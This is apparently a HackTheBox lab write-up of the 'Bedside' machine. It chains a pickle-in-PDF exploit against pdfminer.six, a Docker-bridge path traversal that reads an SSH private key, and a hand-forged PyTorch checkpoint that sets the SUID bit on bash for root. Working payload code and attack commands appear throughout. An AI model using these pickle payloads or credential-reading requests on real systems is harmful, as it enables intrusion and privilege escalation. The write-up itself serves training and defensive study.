---
title: "HTB - Bedside"
date: "2026-09-16"
description: "PDFminer, Docker, Pickle, Pytorch"
platform: "HackTheBox"
difficulty: "Medium"
tags: ["htb", "writeup", "pdfminer", "pickle", "docker", "pytorch", "privesc"]
---

# Bedside — HackTheBox Writeup

Bedside is a medium-difficulty Linux box that looks, on the surface, like a boring clinic website. It's not. Once you dig past the landing page, it turns into a tour of three genuinely different failure modes: a PDF library with a pickle problem, a Docker container that leaks more than it should, and a machine learning script that trusts its input file a little too much.

## TL;DR

A hidden research portal ran `pdfminer.six`, which turned out to be exploitable via a crafted PDF and a planted pickle file — but the shell I got landed inside a Docker container, not the actual host. From there, an internal-only service reachable through the Docker bridge leaked an SSH key via path traversal, which got me onto the real host. Root came from a sudo-permitted ML training script that deserializes PyTorch checkpoints without any safety net — classic pickle RCE, just wearing a machine-learning costume.

## Recon

```bash
nmap -p- -T4 -Pn 10.129.96.243
```

Three ports: SSH, HTTP, and port 3000 showing as *filtered* — not open, not closed, just silently dropped. I checked what commonly lives on 3000 (Node apps, Grafana, Gitea) but without more info there wasn't much to do with it yet. Filed away for later — filtered ports are worth remembering, not ignoring.

`whatweb` on the main site showed a standard Apache/Debian stack behind "Bedside Clinic" branding. Nothing jumped out except the contact email, which hinted the real domain naming convention.

## Foothold

### Finding the hidden portal

Since the main site was a dead end, I ran a Host-header fuzz against `bedside.htb`:

```bash
ffuf -H "Host: FUZZ.bedside.htb" -u http://bedside.htb -w common.txt -c -ic
```

Most hits were 301 redirects (probably a generic catch-all), but one stood out with a clean 200: `research`. Pointing at `research.bedside.htb` revealed a "Bedside Research Portal" — and its response headers gave away something genuinely interesting: `X-Powered-By: pdfminer.six`.

That's not a common thing to see advertised in a header, and `pdfminer.six` has had its share of security history around how it processes PDF internals. Worth a closer look.

### The pickle-in-a-PDF trick

After digging through how `pdfminer.six` handles font encodings, the exploit path became clear: PDFs can define custom font encodings that point to external resources, and under the right conditions, `pdfminer.six` will load and *unpickle* a file referenced that way. Unpickling attacker-controlled data is basically an invitation for code execution — any object with a `__reduce__` method gets to run arbitrary code the moment it's deserialized.

So the plan was: upload a malicious pickle file somewhere the app can reach, then upload a PDF whose font `/Encoding` entry points at it.

```python
class EvilPayload:
    def __reduce__(self):
        return (eval, (payload_code,))  # payload_code: base64-wrapped reverse shell
```

I wrapped the actual reverse shell command in base64 first — nested quoting between Python, pickle, and shell gets ugly fast otherwise, and base64 sidesteps the whole problem.

The PDF itself was a minimal, mostly-empty document — the interesting part was entirely in the font object:

```
5 0 obj
<<
/Type /Font
/Subtype /Type0
/BaseFont /MaliciousFont-Identity-H
/Encoding /uploads#2Fmalicious
/DescendantFonts [6 0 R]
>>
```

First attempt: nothing. Waited, tried again, still nothing. The bug turned out to be one small detail — I was pointing the encoding at an *absolute* filesystem path (`/var/www/research.bedside.htb/uploads/malicious`), and the vulnerable code apparently resolves paths relative to its own working directory. Switching to a relative path (`uploads/malicious`) was the fix. Small detail, total difference between "nothing happens" and "shell caught."

### Wait — this isn't the actual box

Shell landed:

```
$ cat /etc/passwd
...
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

That `/etc/passwd` was suspiciously short, and `datawrangler` isn't the kind of account name you expect on a general-purpose host — it screams "purpose-built data-processing environment." A few quick checks confirmed it: this was a Docker container, not the actual `bedside` host. Which explained why there was no `user.txt` sitting around waiting for me — the real host was still out of reach.

## Getting Off the Container

Remember that filtered port 3000 from the initial scan? Containers on Docker's default bridge network can often reach things the outside world can't, through the bridge gateway — typically `172.17.0.1`. I pointed a request there:

```bash
curl -s http://172.17.0.1:3000/
```

Something answered. And it looked like exactly the kind of internal service that gets built fast and audited slow — a quick test for path traversal paid off immediately:

```bash
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'
```

(The `--path-as-is` flag matters here — curl normalizes `../` sequences by default before even sending the request, which would have silently defeated this.)

Out came a full OpenSSH private key for a user called `developer`. I'm honestly still not 100% sure what that internal service actually *is* — I found it by process of elimination rather than a clean recon trail — but the key worked:

```bash
ssh -i id_rsa developer@10.129.96.243
```

And there it was — the real host, complete with a stern HIPAA-compliance banner. `user.txt` was sitting right in the home directory.

## Root

`sudo -l` as `developer` pointed at a script: `/opt/trainer/bedside_trainer.py`, runnable as root. It turned out to be a training script for a machine learning model, built on MONAI (a PyTorch-based medical imaging framework — fitting, for a clinic box). It automatically loads the most recent checkpoint file from a directory I could write to.

That's the exact same class of bug as before, just wearing different clothes: PyTorch checkpoints are backed by `pickle` under the hood. If the script loads a checkpoint without `weights_only=True`, a crafted checkpoint executes arbitrary code the instant it's loaded — as root, since the script runs via sudo.

### The annoying part: no PyTorch available

The environment I was working from didn't have PyTorch installed, which meant I couldn't just use `torch.save()` to build a legitimate-looking checkpoint. First instinct was a raw pickle dump — that failed, because `.pt` files aren't raw pickles, they're ZIP archives with pickle data inside at a specific internal path.

Once I worked out that structure (`archive/version` and `archive/data.pkl` inside a plain zip), I could forge one by hand with nothing but the standard library:

```python
import pickle, zipfile, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("chmod u+s /bin/bash",))

payload = {
    "epoch": 999,
    "model_state_dict": MaliciousPayload(),
    "optimizer_state_dict": {}
}

with zipfile.ZipFile("/datastore/checkpoints/checkpoint_epoch_999.pt", "w") as zf:
    zf.writestr("archive/version", "3")
    zf.writestr("archive/data.pkl", pickle.dumps(payload))
```

### The dict keys weren't a guess — the error told me

My first version of the payload used a key called `model`. Running the trainer with `sudo` threw this:

```
ValueError: Key 'model' from x is not found in y: dict_keys(['epoch', 'model_state_dict', 'optimizer_state_dict'])
```

That error is genuinely a gift — it names the exact keys the loader expects. Swapped `model` for `model_state_dict`, kept `epoch` and added an empty `optimizer_state_dict`, and ran it again:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
/bin/bash -p
whoami
# root
```

```bash
cat /root/root.txt
1a38b190b8592da730cbf9ce093aff53
```

## Reflections

Bedside is really three small lessons stacked on top of each other, and each one is worth carrying into the next box:

- **A shell is not automatically the host.** The moment `/etc/passwd` looked off, that should've reset my whole mental model of the target — and it did, but it's worth actively checking for container indicators (`/proc/1/cgroup`, `/.dockerenv`, oddly minimal user lists) as a habit, not an afterthought.
- **Filtered ports aren't dead ends, they're notes to self.** Port 3000 looked like nothing from outside. From inside a container on the same Docker bridge, it was the whole ballgame.
- **Pickle-based RCE isn't just a "Python web app" bug anymore.** It shows up anywhere something gets deserialized without scrutiny — PDF libraries, ML checkpoints, cache files. If you see `pickle`, `torch.load`, `joblib.load`, or anything similar touching attacker-influenced input, it's worth a second look regardless of the surrounding technology stack.
- **A failed exploit attempt can still hand you the answer.** The "wrong" stack trace from my first checkpoint attempt told me exactly what the right one needed to look like. Worth reading errors in full instead of just retrying blindly.